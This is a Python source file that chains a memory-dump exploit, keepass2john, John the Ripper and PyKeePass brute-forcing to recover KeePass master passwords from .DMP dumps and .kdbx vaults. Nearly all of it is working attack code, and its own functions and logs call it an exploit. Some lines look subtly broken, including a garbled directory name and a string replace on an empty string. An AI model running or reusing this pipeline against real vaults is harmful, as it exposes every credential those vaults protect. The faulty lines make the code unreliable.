import os
import re
import subprocess
from typing import Dict, List, Tuple, Union

from pykeepass import PyKeePass
from logger import log_msg
import exrex


def get_or_create_folders() -> Tuple[str, ...]:
    """
    Ensures the existence of specific directories and returns their paths.

    This function retrieves the current working directory and defines paths for several directories.
    If any of the specified directories do not exist, they are created automatically.
    If required library directories do not exist, an exception is raised.

    Raises:
        FileNotFoundError: If a required directory (e.g., keepass-password-dumper or keepass2john) is not found.

    Returns:
        tuple[str, ...]: A tuple containing the paths to the directories.
    """
    log_msg("Getting the list of necessary directories locations...")
    # Get the current working directory (where the main script is executed from)
    main_script_dir = os.getcwd()
    # Define the paths to the libraries and resources directories.
    keepass_password_dumper_dir = os.path.join(main_script_dir, "keepass-password-dumper")
    keepass_dump_dir = os.path.join(main_script_dir, "keepass_dump")
    keepass2john_dir = os.path.join(main_script_dir, "keepass2john")
    possible_pwds_dir = os.path.join(main_script_dir, "possible-pwds")
    generated_pwds_dir = os.path.join(main_script_dir, "generated-pwds")
    keepass_hashes_dir = os.path.join(main_script_dir, "keepass-hashes")
    keepass_dump_masterkey_dir = os.path.join(main_script_dir, "keepakeepass-dump-masterkeyss")
    output_dir = os.path.join(main_script_dir, "output")

    # Check if required libraries directories exist.
    if not os.path.exists(keepass_password_dumper_dir):
        log_msg(f"Please make sure keepass-password-dumper is installed in {keepass_password_dumper_dir}", "WARNING")
        raise FileNotFoundError(f"Required directory not found: {keepass_password_dumper_dir}")

    if not os.path.exists(keepass2john_dir):
        log_msg(f"Please make sure keepass2john is installed in {keepass2john_dir}", "WARNING")
        raise FileNotFoundError(f"Required directory not found: {keepass2john_dir}")

    if not os.path.exists(keepass_dump_dir):
        log_msg(f"Please make sure keepass_dump is installed in {keepass_dump_dir}", "WARNING")
        raise FileNotFoundError(f"Required directory not found: {keepass_dump_dir}")

    if not os.path.exists(keepass_dump_masterkey_dir):
        log_msg(f"Please make sure keepass_dump is installed in {keepass_dump_masterkey_dir}", "WARNING")
        raise FileNotFoundError(f"Required directory not found: {keepass_dump_masterkey_dir}")

    # Check if the directory exists, if not, create it
    if not os.path.exists(possible_pwds_dir):
        os.makedirs(possible_pwds_dir)
    if not os.path.exists(keepass_hashes_dir):
        os.makedirs(keepass_hashes_dir)
    if not os.path.exists(generated_pwds_dir):
        os.makedirs(generated_pwds_dir)
    if not os.path.exists(output_dir):
        os.makedirs(output_dir)

    return (
        keepass_password_dumper_dir,
        keepass2john_dir,
        possible_pwds_dir,
        keepass_hashes_dir,
        generated_pwds_dir,
        keepass_dump_dir,
        keepass_dump_masterkey_dir,
        output_dir,
    )


def collect_dumps(dir: str) -> Tuple[List[str], List[str]]:
    """
    Collects and returns lists of specific file types from a directory.

    This function scans the specified directory and identifies files with specific extensions:
    - Files ending with ".DMP" are added to the dump_files list.
    - Files ending with ".kdbx" are added to the keepass_files list.

    If the directory contains non-file entries (e.g., subdirectories), they are skipped.

    Args:
        dir (str): The directory to scan for files.

    Returns:
        Tuple[List[str], List[str]]: A tuple containing:
            - dump_files: A list of file paths for files ending with ".DMP".
            - keepass_files: A list of file paths for files ending with ".kdbx".

    """
    log_msg(f"Collecting .DMP and .kdbx files from {dir}...")
    dir_list: List[str] = os.listdir(dir)  # We can safely assume str is the return type
    dump_files = []
    keepass_files = []

    for f in dir_list:
        file_path = os.path.join(dir, f)

        # Skip non-file entries like directories
        if not os.path.isfile(file_path):
            continue

        # Add .DMP files to dump_files list
        if f.lower().endswith(".dmp"):
            dump_files.append(file_path)

        # Add .kdbx files to keepass_files list
        if f.lower().endswith(".kdbx"):
            keepass_files.append(file_path)
    log_msg(f"Collected {len(dump_files)} .DMP files.")
    log_msg(f"Collected {len(keepass_files)} .kdbx files.")
    return dump_files, keepass_files


def collect_possible_pwds(dump_files: List[str], keepass_dumper_dir: str, possible_pwds_dir: str) -> List[str]:
    """
    Processes a list of dump files to extract possible passwords and saves them in text files.

    For each file in the provided list of dump files, this function:
    - Checks if the corresponding possible password file already exists in the target directory.
    - If it exists, the file is added to the list of possible password files.
    - If it does not exist, the function runs a subprocess to extract passwords and creates a new password file.

    Args:
        dump_files (list[str]): A list of dump file paths to process.
        keepass_dumper_dir (str): The directory where the password extraction tool is located.
        possible_pwds_dir (str): The directory where possible password files should be saved.

    Returns:
        list[str]: A list of paths to the possible password files.

    """
    log_msg("Collecting possible passwords from .DMP files...")
    possible_pwds_files = []

    for f in dump_files:

        # Get the base file name without extension from an absolute or relative path
        file_name_without_ext = os.path.splitext(os.path.basename(f))[0]
        possible_pwd_file = os.path.join(possible_pwds_dir, f"{file_name_without_ext}.txt")

        if os.path.isfile(possible_pwd_file):
            log_msg(f"Passwords file already exists for {f}: {possible_pwd_file}. Skipping...", "DEBUG")
            possible_pwds_files.append(possible_pwd_file)
            continue

        log_msg(f"Getting possible passwords from {f} file...")

        run_subprocess(
            ["python", "poc.py", f"{f}", "-o", f"{possible_pwd_file}"],
            cwd=keepass_dumper_dir,
            encoding="utf-8",
            check=True,
        )

        log_msg(f"Possible passwords saved in {possible_pwd_file} file...")
        possible_pwds_files.append(possible_pwd_file)

    return possible_pwds_files


def generate_pwds(possible_pwds_files: List[str], generated_pwds_dir: str) -> List[str]:
    """
    Generates password permutations from a list of possible passwords and saves them to text files.

    This function reads possible password files, generates permutations for each password using regex patterns,
    and writes the generated passwords to new files in the specified directory. If the generated file already exists,
    the function skips generating it again.

    Args:
        possible_pwds_files (list[str]): A list of file paths containing possible passwords.
        generated_pwds_dir (str): The directory where generated password files will be saved.

    Returns:
        list[str]: A list of file paths for the generated password files.
    """
    log_msg("Generating passwords...")
    generated_pwd_files = []

    for f in possible_pwds_files:
        file_name_without_ext = os.path.splitext(os.path.basename(f))[0]
        generated_pwd_file = os.path.join(generated_pwds_dir, f"{file_name_without_ext}.txt")

        # Skip if the generated password file already exists
        if os.path.isfile(generated_pwd_file):
            log_msg(f"Passwords file already exists for {f}: {generated_pwd_file}. Skipping...", "DEBUG")
            generated_pwd_files.append(generated_pwd_file)
            continue

        with open(f, "r", encoding="utf-8") as file:
            possible_passwords = file.read().splitlines()
        log_msg(f"Read {len(possible_passwords)} possible passwords from {f} file.")

        generated_passwords = []

        for pwd in possible_passwords:
            pwd = re.escape(pwd)
            # Replace specific characters with wildcards (can generalize if needed)
            pwd = pwd.replace("●", ".").replace("", ".")

            # Generate permutations using exrex and collect them
            pwds = list(exrex.generate(pwd))
            generated_passwords.extend(pwds)
        log_msg(f"Generated {len(generated_passwords)} passwords from {f} file.")

        # Write generated passwords to a file, one password per line
        with open(generated_pwd_file, "w", encoding="utf-8") as file:
            file.writelines(f"{password}\n" for password in generated_passwords)
        log_msg(f"Wrote {len(generated_passwords)} passwords to {generated_pwd_file} file.")
        generated_pwd_files.append(generated_pwd_file)

    return generated_pwd_files


def collect_keepass_hashes(keepass_files: List[str], keepass_hashes_dir: str, keepass2john_dir: str) -> List[str]:
    """
    Processes a list of KeePass files to extract master password hashes and saves them in text files.

    For each file in the provided list of KeePass files, this function:
    - Checks if the corresponding hash file already exists in the target directory.
    - If it exists, the hash file is added to the list of KeePass hash files.
    - If it does not exist, the function runs a subprocess to extract the hash and saves it in a new hash file.

    Args:
        keepass_files (list[str]): A list of KeePass (.kdbx) file paths to process.
        keepass_hashes_dir (str): The directory where KeePass hash files should be saved.
        keepass2john_dir (str): The directory where the keepass2john script is located.

    Returns:
        list[str]: A list of paths to the KeePass hash files.
    """
    log_msg("Collecting keepass hashes from .kdbx files...")
    keepass_hash_files = []

    for f in keepass_files:
        file_name_without_ext = os.path.splitext(os.path.basename(f))[0]
        keepass_hash_file = os.path.join(keepass_hashes_dir, f"{file_name_without_ext}.txt")

        # Skip if the hash file already exists
        if os.path.isfile(keepass_hash_file):
            log_msg(f"Password file already exists for {f}: {keepass_hash_file}. Skipping...", "DEBUG")
            keepass_hash_files.append(keepass_hash_file)
            continue

        log_msg(f"Extracting master password hash from {f}...")

        result = run_subprocess(["python", "keepass2john.py", f"{f}"], cwd=keepass2john_dir, check=True)

        # Extract and clean the hash from stdout
        clean_hash = result.stdout.split(":", 1)[-1]

        # Write the clean hash to the output file
        with open(keepass_hash_file, "a", encoding="utf-8") as file:
            file.write(clean_hash)

        log_msg(f"Hash saved in {keepass_hash_file}.")
        keepass_hash_files.append(keepass_hash_file)
    return keepass_hash_files


def exploit_keepass_hashes(generated_pwds_files: List[str], keepass_hash_files: List[str]) -> List[Dict[str, str]]:
    """
    Attempts to crack KeePass hashes using generated password files with John.

    This function processes the provided generated password files, matches them to the corresponding KeePass hash files,
    and uses John to attempt cracking the hashes. After each attempt, it uses John's `--show` option to display
    any cracked passwords. The results are logged and returned as a list of dictionaries containing the hash file name
    and the cracked result (if any).

    Args:
        generated_pwds_files (List[str]): A list of file paths containing generated password lists (wordlists).
        keepass_hash_files (List[str]): A list of file paths containing KeePass hash files to crack.

    Returns:
        List[Dict[str, str]]: A list of dictionaries with each entry containing:
            - 'file': The name of the hash file.
            - 'result': The cracked password output from John (if found).
    """

    log_msg("Exploiting keepass hashes...")
    john_path = os.getenv("JOHN_PATH", "C:/john/run")

    # Preprocess the generated_pwds_files to build a lookup table (dictionary) for faster matching
    wordlist_lookup = {os.path.splitext(os.path.basename(gpf))[0]: gpf for gpf in generated_pwds_files}

    # Results list to store cracked passwords
    results = []

    # Attempt to crack each KeePass hash file
    for hash_file in keepass_hash_files:
        hash_file_name = os.path.splitext(os.path.basename(hash_file))[0]

        # Match the corresponding wordlist for the hash file
        matching_wordlist = wordlist_lookup.get(hash_file_name, "")

        if not matching_wordlist:
            log_msg(f"No matching wordlist found for {hash_file_name}. Skipping...", "WARNING")
            continue

        # Run John attack
        log_msg(f"Running John on {hash_file_name} using wordlist {matching_wordlist}...", "DEBUG")
        run_subprocess(
            ["john", "--format=KeePass", f"--wordlist={matching_wordlist}", f"{hash_file}"],
            cwd=john_path,
            check=True,
        )

        result_show = run_subprocess(["john", "--show", f"{hash_file}"], cwd=john_path, check=True)
        log_msg(f"New cracked passwords for {hash_file_name}:\n{result_show.stdout}")
        results.append({"file": hash_file_name, "result": result_show.stdout})
    log_msg("Exploit DONE!")
    return results


def generate_pod_file(exploit_results: List[Dict[str, str]], output_dir: str) -> None:
    pod_file = os.path.join(output_dir, "output.potfile")

    with open(pod_file, "w", encoding="utf-8") as file:
        file.writelines(f"{exploit['result']}" for exploit in exploit_results)
    return pod_file


def brute_force(generated_pwds_files: List[str], keepass_files: List[str]):
    cracks = []
    for f in keepass_files:
        log_msg(f"Exploiting {f}", "DEBUG")
        for pf in generated_pwds_files:
            if any(crack["keepass_file"] == f for crack in cracks):
                break
            if any(crack["possible_pwd_file"] == pf for crack in cracks):
                continue
            log_msg(f"Using pwds file {pf}", "DEBUG")
            with open(pf, "r", encoding="utf-8") as file:
                passwords = file.read().splitlines()
                for pwd in passwords:
                    if any(crack["keepass_file"] == f for crack in cracks):
                        break
                    log_msg(f"Using pwd {pwd}", "DEBUG")

                    try:
                        kp = PyKeePass(f, password=pwd)
                        log_msg(f"Cracked: {pwd}->{kp.database_name}")
                        cracks.append({"keepass_file": f, "pwd": pwd, "possible_pwd_file": pf})
                        break
                    except Exception:
                        continue
    log_msg(f"{cracks}", "DEBUG")


def run_subprocess(
    args: Union[str, bytes, os.PathLike],
    on_error_message: str = None,
    shell: bool = False,
    cwd: str = None,
    encoding: str = None,
    timeout: float = None,
    check: bool = False,  # Adds a check parameter to raise an exception if returncode is non-zero
    input: str = None,  # Adds input parameter to pass data to stdin
) -> subprocess.CompletedProcess[str]:
    """
    Wrapper function that calls subprocess.run with given arguments.

    Args:
        args (tuple) : Arguments to pass to subprocess.run.
        on_error_message (str) : Custom error message to log when subprocess fails.
        shell (bool) : Sets the shell flag of subprocess.run.
        cwd (str): The directory from which to run the command. Defaults to None.
        encoding (str): Specifies encoding for the output.
        timeout (float): Specifies timeout for subprocess.run.
        check (bool): If True, raise a CalledProcessError on non-zero exit code.
        input (str): Data to send to the subprocess' stdin.

    Raises:
        RuntimeError: When subprocess.run returns a non-zero exit code and check is False.
        subprocess.CalledProcessError: If check is True and a non-zero exit code occurs.

    Returns:
        subprocess.CompletedProcess[str] : Result of subprocess.run.
    """

    if shell:
        log_msg(f"Potential security risk: args {args} is running in shell!", "WARNING")

    try:
        # Pass the input argument if specified
        result = subprocess.run(
            args,
            capture_output=True,  # Capture stdout and stderr
            text=True,  # Treat stdout, stderr, and input as text (str)
            shell=shell,  # Run in shell if needed
            cwd=cwd,  # Working directory
            encoding=encoding,  # Encoding for input and output
            timeout=timeout,  # Timeout for the process
            input=input,  # Input data for stdin
            check=check,  # Raise error if command fails (non-zero exit code)
        )
        return result

    except subprocess.TimeoutExpired as e:
        raise RuntimeError(f"Subprocess timed out: {e}")

    except subprocess.CalledProcessError as e:
        if not on_error_message:
            on_error_message = str(args)
        raise RuntimeError(f"{on_error_message}: {e.stderr.strip()}")

    except Exception as e:
        raise RuntimeError(f"An unexpected error occurred: {str(e)}")
